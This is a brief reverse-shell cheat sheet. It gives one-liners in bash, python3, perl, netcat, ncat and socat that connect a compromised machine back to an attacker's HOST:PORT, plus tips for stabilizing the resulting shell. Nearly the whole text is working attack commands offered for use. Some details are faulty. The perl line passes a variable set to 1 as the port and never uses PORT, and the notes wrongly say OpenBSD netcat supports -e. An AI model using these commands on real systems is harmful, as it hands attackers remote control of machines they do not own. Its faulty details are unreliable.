# Reverse Shells

## One-liners

Most-used set only. Replace `HOST`/`PORT`.

```bash
# bash — no extra binaries needed
bash -i >& /dev/tcp/HOST/PORT 0>&1

# python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("HOST",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# perl
perl -e 'use Socket;$i=1;$p="PORT";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($i,inet_aton("HOST")));open(STDIN,"<&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'

# netcat (needs -e support; openbsd nc has it, ncat uses --exec)
nc -e /bin/sh HOST PORT
ncat --exec /bin/sh HOST PORT

# socat (gives a real PTY)
socat exec:'/bin/sh -i',pty,stderr,setsid,sigint,sane TCP:HOST:PORT
```

Notes:
- `/dev/tcp` is a bash feature — it fails in `dash`/`sh`. Run it as `bash -c '...'` if the target has no `bash` in `$PATH`.
- Only the `socat` line allocates a real PTY; the others give a shell without a TTY, so they often drop to `$` with no prompt. Fix it with the stabilization trick below.
- `nc -e` was removed from some netcat builds. `ncat --exec` and `socat` are the reliable fallbacks.

## Stabilization

```bash
python3 -c "import pty; pty.spawn('/bin/bash')"
# `Ctrl+Z`, then locally:
stty raw -echo; fg
```
